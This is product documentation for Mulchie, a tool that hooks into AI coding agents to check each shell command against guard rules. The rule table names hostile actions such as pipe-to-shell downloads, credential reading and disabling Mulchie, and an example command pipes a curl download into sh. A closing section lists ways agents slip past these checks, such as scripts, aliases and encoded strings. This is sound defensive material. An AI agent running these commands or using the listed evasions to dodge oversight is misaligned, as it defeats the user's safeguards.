---
title: Hooks and guard rules
description: "Connect Mulchie to Claude Code, Codex, Cursor, Gemini CLI and Copilot CLI hooks. What the hook sends, how it fails open, and the guard rules that warn or block."
---

Use hooks to let an agent tell Mulchie when a session starts and before and after each shell command, so Mulchie can give it advice, hand it limit breaches and run guard rules on the command.

Hooks and guard rules are a courtesy between Mulchie and an agent that cooperates. They are not a sandbox. See [what guard rules miss](#what-guard-rules-miss).

## Install

```sh
mulchie hooks install --client claude-code --dry-run
mulchie hooks install --client claude-code
mulchie hooks status
mulchie hooks uninstall --client claude-code
```

`--client` is `claude-code`, `codex`, `cursor`, `gemini` or `copilot`. `--dry-run` prints the exact change and changes nothing. `mulchie hooks status` lists which apps have Mulchie's hooks and for which events. `uninstall` removes exactly the entries `install` added.

| Client | File that `install` edits | Events registered (Mulchie's name: the client's name) |
| --- | --- | --- |
| `claude-code` | `~/.claude/settings.json` (or under `$CLAUDE_CONFIG_DIR`) | session start: `SessionStart`; prompt: `UserPromptSubmit`; before and after a shell command: `PreToolUse` and `PostToolUse` for `Bash`; stop: `Stop`; end: `SessionEnd` |
| `codex` | `~/.codex/hooks.json` (or under `$CODEX_HOME`) | The same names as Claude Code. |
| `cursor` | `~/.cursor/hooks.json` | `sessionStart`, `beforeSubmitPrompt`, `beforeShellExecution`, `afterShellExecution`, `stop`, `sessionEnd` |
| `gemini` | `~/.gemini/settings.json` | `SessionStart`, `BeforeAgent`, `BeforeTool` and `AfterTool` for `run_shell_command`, `AfterAgent`, `SessionEnd` |
| `copilot` | `~/.copilot/hooks/mulchie.json` (or under `$COPILOT_HOME`) | `sessionStart`, `userPromptSubmitted`, `preToolUse`, `postToolUse`, `agentStop`, `sessionEnd` |

What `install` does to the file:

- Other keys and other hooks in the file are kept, in their order. A hook of your own on the same event is never touched.
- A file that cannot be parsed is not changed.
- The old file is copied to `<file>.mulchie-backup-<unix time>` first. The new file is written through a temporary file and a rename, after a check that the app did not save the file in the meantime.
- Every hook has a timeout of 5 seconds in the client's own unit (Codex's `SessionEnd`: 2 seconds).

Each entry runs `mulchie hook <client> <event>` by the absolute path of the binary you ran. The command first checks that the binary still exists and allows the action if it does not, so removing Mulchie without `mulchie hooks uninstall` does not break the agent. For the shell-command event, `--guard off|warn|block` on `install` writes how far guard rules may go in that app (see [warn and block](#warn-and-block-by-client)).

After installing:

- **Claude Code** reloads `settings.json` on its own. Sessions already running may need a restart.
- **Codex** runs a hook that is not managed only after you review and trust it. Run `/hooks` in Codex (or Settings, Hooks, in the app) and trust the Mulchie hooks. A changed hook command (for example after the Mulchie binary moves and you re-run `hooks install`) is skipped until you trust it again. How Codex treats a hook that exits with an unexpected code is unconfirmed. Mulchie's hook exits 0 whenever it fails open (see below).
- **Cursor**: restart it if it does not pick the hooks up. **Gemini CLI**: restart it. Gemini CLI 0.18.x runs hooks only when `tools.enableHooks` is true in `~/.gemini/settings.json`; newer versions may not need it. Mulchie does not set it: `hooks install --client gemini` and `hooks status` print a note when it is not `true`. **Copilot CLI**: new sessions load the hooks.

Mulchie has no hook support for Windsurf, Antigravity, opencode or Aider. It supports only clients whose hook mechanism it has written to. Sessions of `aider` and `opencode` are still found in the process table (see [Sessions](/docs/sessions/)), without hooks.

## What the hook does

The hook reads the client's event on stdin, tells the engine, and prints the client's own answer format.

- **Session start**: the agent gets two or three sentences about the machine and house rules: run heavy builds as `mulchie run -- <command>`, and do not delete caches or worktrees or kill processes to free resources, because Mulchie does that through plans you approve.
- **Before a shell command**: the command is checked against the [guard rules](#guard-rules). While heavy work is not advised, a recognised heavy build (a `cargo`, `go`, `make`, `gradle` or `npm run build` command, and similar) also gets advice to run it as `mulchie run`. This advice never blocks.
- **Any event**: the session's [limit breaches](/docs/sessions/#limits) not yet delivered are handed to the agent, once.
- **After a shell command, prompt, stop and session end**: recorded in the session's [activity record](/docs/sessions/#the-activity-record).

The hook maps the event to a session from the process that ran it and its parents. If no session covers it, the nearest agent process above it (or else the nearest process that is not a shell) is registered as a session. A session registered this way is **reported, never limited**. A session is bound to the first client and client session id that report for it; breaches go only to that client, and events from any other caller are recorded with `unbound: true`.

### What is sent

The hook talks only to the engine on `127.0.0.1`, with the read-only token. It sends the client's name and session id, the event, the pid of the process that ran the hook, the working directory, and for shell commands the tool name and the command text (cut at 8 KiB). **Prompt text is never sent to the engine.** The command text is redacted and cut before it is stored in the activity record.

### It fails open

A hook can never stall or block an agent by being broken. With no engine, an engine that does not answer within 300 ms (the budget for everything, from reading stdin to the reply), input it cannot read, or any other error, the hook allows the action, exits 0 and prints only what the client reads as "go ahead". It writes the reason to `hook.log` in the config directory, at most once a minute (the file restarts at 256 KiB).

## Guard rules

A guard rule matches the text of one shell command. It is a tripwire for agents that are not trying to hide, not a sandbox.

| Rule | Matches |
| --- | --- |
| `recursive_delete` | `rm -r`, `mv`, `find -delete`, `rsync --delete`, `git clean -f` with `-d` or `-x`, or `xargs rm -r`, of something outside the session's workspace, or of your home folder or `/`. Without a known workspace, the working directory is used. |
| `pipe_to_shell` | Piping a download into a shell (`curl … \| sh`), or running a file an earlier part of the command downloaded. |
| `sudo` | `sudo` or `doas`. The command they run is checked as well. |
| `force_push` | A force-push to, deletion of, or history rewrite of a protected branch. `guard.protected_branches` defaults to `main` and `master`. |
| `disable_mulchie` | Stopping, unloading or removing Mulchie, or editing its files. |
| `credential_read` | Reading SSH private keys or cloud credentials, or dumping the keychain. |
| `startup_write` | Writing shell startup files, launch agents, systemd user units or the crontab. |
| `runaway_repeat` | A command that, in the directory it would run in, Mulchie saw starting itself over and over within the last `runaway.remember_secs` (default one hour). See [runaway chains](/docs/sessions/#runaway-chains). It matches the program and arguments exactly, so `npm run build` is matched and `npx react-router build` is not. |
| `too_long` | A command over 64 KiB, of which only the first 64 KiB were checked. Always a warning, not configurable. |

Each rule's mode is `off`, `warn` or `block`. **Every rule defaults to `warn`.**

```sh
mulchie config set guard.rules.sudo block
mulchie config set guard.rules.startup_write off
mulchie config set guard.protected_branches '["main", "release"]'
mulchie config set guard.enabled false      # no rule is evaluated
```

Ask the rules about a command without running it. Nothing is recorded:

```sh
mulchie guard check -- 'curl -s https://example.com/i.sh | sh'
mulchie guard check --cwd ~/dev/app --json -- rm -rf build
```

The exit status is 0 for allow, 4 for warn, 3 for block and 1 for an error. Agents ask the same question with the MCP `check_command` tool.

### Warn and block by client

`warn` and `block` are what the engine answers. What the client does with that depends on the client. This is for a shell command, before it runs:

| Client | Engine says `warn` | Engine says `block` |
| --- | --- | --- |
| Claude Code | Asks you to confirm the command. | Refuses it and tells the agent why. |
| Cursor | Asks you to confirm. | Refuses it. |
| Copilot CLI | Asks you to confirm. | Refuses it. |
| Codex | No confirmation. The command runs, and the warning goes to you and the agent as text. | Refuses it. |
| Gemini CLI | No confirmation. The command runs, and you see the warning. | Refuses it. |

In Copilot CLI's autopilot mode no prompt is shown, so an "ask" decision is denied and a guard `warn` becomes a refusal there.

`--guard` on `hooks install` (or on `mulchie hook`) sets a ceiling per app: `off` never asks or blocks, and a warning becomes advice to the agent. `warn` turns a `block` into a warning, which for Codex and Gemini CLI is only text. `block` follows the engine.

### What guard rules miss

- They read command text. A script file the agent wrote and then runs, an alias, an encoded string, a variable that holds a path or a command built at run time can all get past them.
- The parser prefers a missed match to a false alarm. When it cannot tell what a word means (an unknown variable, a command substitution used as a path, an unbalanced quote), the rule does not match.
- They see commands the client reports through its hook. A client without hooks, a tool other than the shell tool, or an agent that does not run the hook is not checked.

Use limits, protected branches on your git host, and a real sandbox for anything that must hold.
